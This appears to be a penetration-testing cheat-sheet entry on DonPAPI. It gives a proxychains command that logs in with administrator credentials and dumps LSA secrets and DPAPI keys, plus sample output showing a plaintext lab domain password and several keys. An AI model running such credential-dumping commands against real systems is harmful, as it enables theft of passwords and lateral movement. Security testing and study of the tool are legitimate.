# DonPapi

* DonPapi is a tool used to remotely dump credentials from an AD enviroment&#x20;

```
proxychains python3 DonPAPI.py -local_auth Administrator:fbkj8deR@10.10.121.107
INFO [10.10.121.107]  [+] Dumping LSA Secrets
INFO [10.10.121.107] [+]  LSA :  testlab.local\epugh : Passwrd2017123 
INFO [10.10.121.107] [-] Found DPAPI Machine key : 0x7128b9eca864ea503bb1efb50ce803588dcf9662
INFO [10.10.121.107] [-] Found DPAPI User key : 0x4f2b5c6dff20964ecf76b8015d860968f7035ce2
INFO [10.10.121.107] [-] Found DPAPI Machine key : 0x6dafe0bdd0b11149bb70926ec96fbd3262b26928
INFO [10.10.121.107] [-] Found DPAPI User key : 0x8adecef5c32354a2dbfd1f640876f251c5e8688b
```
